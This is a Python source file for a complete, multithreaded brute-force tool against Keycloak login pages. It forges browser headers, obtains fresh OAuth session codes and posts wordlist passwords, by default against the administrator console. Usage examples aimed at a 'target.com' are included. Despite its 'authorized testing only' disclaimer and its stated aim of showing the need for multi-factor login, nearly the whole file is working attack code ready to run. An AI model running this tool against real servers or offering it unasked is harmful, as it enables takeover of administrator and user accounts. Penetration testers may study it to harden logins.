#!/usr/bin/env python3
"""
Keycloak Password Brute-Force PoC Tool
For authorized penetration testing only.

This tool demonstrates the need for MFA by showing how passwords
can be brute-forced when only username/password auth is enabled.
"""

import requests
import re
import argparse
import time
import sys
import secrets
import hashlib
import base64
import threading
from datetime import datetime
from queue import Queue
from urllib.parse import urlparse, parse_qs
from typing import Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed


class KeycloakBruteforce:
    def __init__(self, base_url: str, username: str, verbose: bool = False,
                 delay: float = 0.0, threads: int = 1, realm: str = None,
                 client_id: str = None, redirect_uri: str = None):
        self.base_url = base_url.rstrip('/')
        self.username = username
        self.verbose = verbose
        self.delay = delay
        self.threads = threads
        self.realm = realm
        self.client_id = client_id

        # Set default redirect URI if not specified
        if redirect_uri is None:
            self.redirect_uri = f'{self.base_url}/admin/{realm}/console/'
        else:
            self.redirect_uri = redirect_uri

        # Thread-safe counters and flags
        self.lock = threading.Lock()
        self.attempts = 0
        self.successful = False
        self.found_password = None
        self.stop_flag = threading.Event()

        # Start time for statistics
        self.start_time = None

    def get_timestamp(self) -> str:
        """Get current timestamp in readable format."""
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

    def create_session(self) -> requests.Session:
        """Create a new requests session with proper headers."""
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Sec-Ch-Ua': '"Not(A:Brand";v="8", "Chromium";v="144"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Upgrade-Insecure-Requests': '1',
        })
        return session

    def log(self, message: str, level: str = "INFO", show_timestamp: bool = True):
        """Print log message with timestamp."""
        if level in ["SUCCESS", "ERROR", "WARN"] or self.verbose:
            prefix = {
                "INFO": "[*]",
                "SUCCESS": "[+]",
                "ERROR": "[-]",
                "WARN": "[!]",
                "DEBUG": "[D]"
            }.get(level, "[*]")

            timestamp = f"[{self.get_timestamp()}] " if show_timestamp else ""

            with self.lock:
                print(f"{timestamp}{prefix} {message}")

    def generate_pkce(self) -> Tuple[str, str]:
        """Generate PKCE code_verifier and code_challenge."""
        code_verifier = secrets.token_urlsafe(32)
        code_challenge = hashlib.sha256(code_verifier.encode('utf-8')).digest()
        code_challenge = base64.urlsafe_b64encode(code_challenge).decode('utf-8').rstrip('=')
        return code_verifier, code_challenge

    def get_fresh_session(self, session: requests.Session) -> Optional[Tuple[str, str, str, str]]:
        """
        Fetch a fresh session code by initiating the OAuth flow.
        Returns tuple of (session_code, execution_id, tab_id, client_data) or None on failure.
        """
        code_verifier, code_challenge = self.generate_pkce()
        auth_url = f"{self.base_url}/realms/{self.realm}/protocol/openid-connect/auth"

        params = {
            'client_id': self.client_id,
            'redirect_uri': self.redirect_uri,
            'response_mode': 'query',
            'response_type': 'code',
            'scope': 'openid',
            'code_challenge': code_challenge,
            'code_challenge_method': 'S256',
            'nonce': secrets.token_urlsafe(16),
            'state': secrets.token_urlsafe(16),
        }

        try:
            response = session.get(auth_url, params=params, allow_redirects=True)

            if response.status_code != 200:
                return None

            login_action_match = re.search(
                r'"loginAction":\s*"([^"]+)"',
                response.text
            )

            if not login_action_match:
                return None

            login_action_url = login_action_match.group(1).replace('\\/', '/')
            parsed = urlparse(login_action_url)
            query_params = parse_qs(parsed.query)

            session_code = query_params.get('session_code', [None])[0]
            execution = query_params.get('execution', [None])[0]
            tab_id = query_params.get('tab_id', [None])[0]
            client_data = query_params.get('client_data', [None])[0]

            if not all([session_code, execution, tab_id]):
                return None

            return session_code, execution, tab_id, client_data

        except requests.RequestException:
            return None

    def attempt_login(self, password: str, session: requests.Session) -> Tuple[bool, str]:
        """
        Attempt login with given password.
        Returns (success: bool, message: str)
        """
        if self.stop_flag.is_set():
            return False, "Stopped"

        session_data = self.get_fresh_session(session)
        if not session_data:
            return False, "Failed to get fresh session"

        session_code, execution, tab_id, client_data = session_data

        login_url = f"{self.base_url}/realms/{self.realm}/login-actions/authenticate"

        params = {
            'session_code': session_code,
            'execution': execution,
            'client_id': self.client_id,
            'tab_id': tab_id,
        }
        if client_data:
            params['client_data'] = client_data

        data = {
            'username': self.username,
            'password': password,
            'credentialId': ''
        }

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': self.base_url,
            'Cache-Control': 'max-age=0',
        }

        try:
            response = session.post(
                login_url,
                params=params,
                data=data,
                headers=headers,
                allow_redirects=False
            )

            with self.lock:
                self.attempts += 1

            if response.status_code == 302:
                location = response.headers.get('Location', '')
                if 'code=' in location or '/admin/' in location:
                    return True, "Login successful - redirected to admin console"
                elif 'error=' in location:
                    return False, "Login failed - error in redirect"

            if response.status_code == 200:
                if 'Invalid username or password' in response.text:
                    return False, "Invalid credentials"
                elif 'Account is disabled' in response.text:
                    return False, "Account disabled"
                elif 'Account is locked' in response.text:
                    return False, "Account locked"
                elif 'kc-login' in response.text or 'loginAction' in response.text:
                    return False, "Login failed - returned to login page"

            return False, f"Unknown response: HTTP {response.status_code}"

        except requests.RequestException as e:
            return False, f"Request error: {e}"

    def worker(self, password: str, index: int, total: int) -> Optional[str]:
        """Worker function for thread pool."""
        if self.stop_flag.is_set():
            return None

        # Create a new session for this thread
        session = self.create_session()

        timestamp = self.get_timestamp()
        success, message = self.attempt_login(password, session)

        if success:
            self.stop_flag.set()
            with self.lock:
                self.successful = True
                self.found_password = password
            self.log(f"PASSWORD FOUND: {password}", "SUCCESS")
            self.log(f"Message: {message}", "SUCCESS")
            return password
        else:
            if self.verbose:
                with self.lock:
                    print(f"[{timestamp}] [D] [{index}/{total}] {password} - {message}")

        if self.delay > 0:
            time.sleep(self.delay)

        return None

    def bruteforce(self, wordlist_path: str) -> Optional[str]:
        """
        Perform multi-threaded brute-force attack using passwords from wordlist.
        Returns the found password or None.
        """
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.log(f"Wordlist not found: {wordlist_path}", "ERROR")
            return None
        except Exception as e:
            self.log(f"Error reading wordlist: {e}", "ERROR")
            return None

        total = len(passwords)
        self.start_time = datetime.now()

        self.log(f"Starting brute-force attack against user '{self.username}'", "INFO")
        self.log(f"Loaded {total} passwords from wordlist", "INFO")
        self.log(f"Target: {self.base_url}", "INFO")
        self.log(f"Threads: {self.threads}", "INFO")
        print("-" * 70)

        if self.threads == 1:
            # Single-threaded mode
            session = self.create_session()
            for i, password in enumerate(passwords, 1):
                if self.stop_flag.is_set():
                    break

                timestamp = self.get_timestamp()
                success, message = self.attempt_login(password, session)

                if not self.verbose:
                    with self.lock:
                        elapsed = (datetime.now() - self.start_time).total_seconds()
                        rate = self.attempts / elapsed if elapsed > 0 else 0
                        sys.stdout.write(f"\r[{timestamp}] [*] Progress: {i}/{total} ({i*100//total}%) | Rate: {rate:.1f}/s | Current: {password[:20]:<20}")
                        sys.stdout.flush()

                if success:
                    print()
                    self.log(f"PASSWORD FOUND: {password}", "SUCCESS")
                    self.log(f"Message: {message}", "SUCCESS")
                    self.successful = True
                    self.found_password = password
                    return password
                else:
                    if self.verbose:
                        print(f"[{timestamp}] [D] [{i}/{total}] {password} - {message}")

                if self.delay > 0:
                    time.sleep(self.delay)
        else:
            # Multi-threaded mode
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {}
                for i, password in enumerate(passwords, 1):
                    future = executor.submit(self.worker, password, i, total)
                    futures[future] = password

                completed = 0
                for future in as_completed(futures):
                    if self.stop_flag.is_set():
                        break

                    completed += 1
                    result = future.result()

                    if not self.verbose and not self.stop_flag.is_set():
                        with self.lock:
                            timestamp = self.get_timestamp()
                            elapsed = (datetime.now() - self.start_time).total_seconds()
                            rate = self.attempts / elapsed if elapsed > 0 else 0
                            sys.stdout.write(f"\r[{timestamp}] [*] Progress: {completed}/{total} ({completed*100//total}%) | Rate: {rate:.1f}/s | Attempts: {self.attempts}")
                            sys.stdout.flush()

                    if result:
                        return result

        print()
        if not self.successful:
            self.log(f"Brute-force complete. No valid password found after {self.attempts} attempts.", "WARN")
        return self.found_password

    def single_attempt(self, password: str) -> bool:
        """Test a single password."""
        self.start_time = datetime.now()
        self.log(f"Testing single password for user '{self.username}'", "INFO")

        session = self.create_session()
        success, message = self.attempt_login(password, session)

        if success:
            self.log(f"PASSWORD VALID: {password}", "SUCCESS")
            self.log(f"Message: {message}", "SUCCESS")
            return True
        else:
            self.log(f"Password '{password}' failed: {message}", "INFO")
            return False

    def print_summary(self):
        """Print attack summary."""
        end_time = datetime.now()
        duration = (end_time - self.start_time).total_seconds() if self.start_time else 0
        rate = self.attempts / duration if duration > 0 else 0

        print("\n" + "=" * 70)
        print("ATTACK SUMMARY")
        print("=" * 70)
        print(f"Target URL:      {self.base_url}")
        print(f"Realm:           {self.realm}")
        print(f"Client ID:       {self.client_id}")
        print(f"Username:        {self.username}")
        print(f"Threads:         {self.threads}")
        print(f"Total attempts:  {self.attempts}")
        print(f"Duration:        {duration:.2f} seconds")
        print(f"Average rate:    {rate:.2f} attempts/second")
        print(f"Start time:      {self.start_time.strftime('%Y-%m-%d %H:%M:%S') if self.start_time else 'N/A'}")
        print(f"End time:        {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Result:          {'SUCCESS' if self.successful else 'FAILED'}")
        if self.found_password:
            print(f"Found password:  {self.found_password}")
        print("=" * 70)


def main():
    parser = argparse.ArgumentParser(
        description='Keycloak Password Brute-Force PoC Tool (Authorized Testing Only)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Brute-force with wordlist (single thread)
  python keycloak_bruteforce.py -u https://target.com -U USERNAME -r REALM -c CLIENT_ID -w passwords.txt

  # Multi-threaded brute-force (10 threads)
  python keycloak_bruteforce.py -u https://target.com -U USERNAME -r REALM -c CLIENT_ID -w passwords.txt -t 10

  # Test single password
  python keycloak_bruteforce.py -u https://target.com -U USERNAME -r REALM -c CLIENT_ID -p "testpass123"

  # Custom redirect URI
  python keycloak_bruteforce.py -u https://target.com -U USERNAME -r REALM -c CLIENT_ID -w passwords.txt --redirect-uri https://target.com/app/callback

  # Verbose mode with custom delay
  python keycloak_bruteforce.py -u https://target.com -U USERNAME -r REALM -c CLIENT_ID -w passwords.txt -v -d 0.1

DISCLAIMER: This tool is for authorized penetration testing only.
Unauthorized access to computer systems is illegal.
        """
    )

    parser.add_argument('-u', '--url', required=True,
                        help='Base URL of Keycloak server (e.g., https://target.com)')
    parser.add_argument('-U', '--username', required=True,
                        help='Target username to brute-force')
    parser.add_argument('-w', '--wordlist',
                        help='Path to password wordlist file')
    parser.add_argument('-p', '--password',
                        help='Single password to test')
    parser.add_argument('-t', '--threads', type=int, default=1,
                        help='Number of threads (default: 1)')
    parser.add_argument('-d', '--delay', type=float, default=0.0,
                        help='Delay between attempts in seconds (default: 0)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output')
    parser.add_argument('--no-ssl-verify', action='store_true',
                        help='Disable SSL certificate verification')
    parser.add_argument('-r', '--realm', required=True,
                        help='Keycloak realm name (e.g., master, myrealm)')
    parser.add_argument('-c', '--client-id', required=True,
                        help='OAuth client ID (e.g., security-admin-console, account-console)')
    parser.add_argument('--redirect-uri',
                        help='OAuth redirect URI (default: {url}/admin/{realm}/console/)')

    args = parser.parse_args()

    if not args.wordlist and not args.password:
        parser.error("Either --wordlist or --password must be specified")

    if args.no_ssl_verify:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        requests.packages.urllib3.disable_warnings()

    print("""
============================================================
     Keycloak Password Brute-Force PoC Tool
     For Authorized Penetration Testing Only
============================================================
    """)

    bf = KeycloakBruteforce(
        base_url=args.url,
        username=args.username,
        verbose=args.verbose,
        delay=args.delay,
        threads=args.threads,
        realm=args.realm,
        client_id=args.client_id,
        redirect_uri=args.redirect_uri
    )

    if args.no_ssl_verify:
        requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'ALL'

    try:
        if args.password:
            bf.single_attempt(args.password)
        else:
            bf.bruteforce(args.wordlist)

        bf.print_summary()

    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user")
        bf.stop_flag.set()
        bf.print_summary()
        sys.exit(1)


if __name__ == '__main__':
    main()
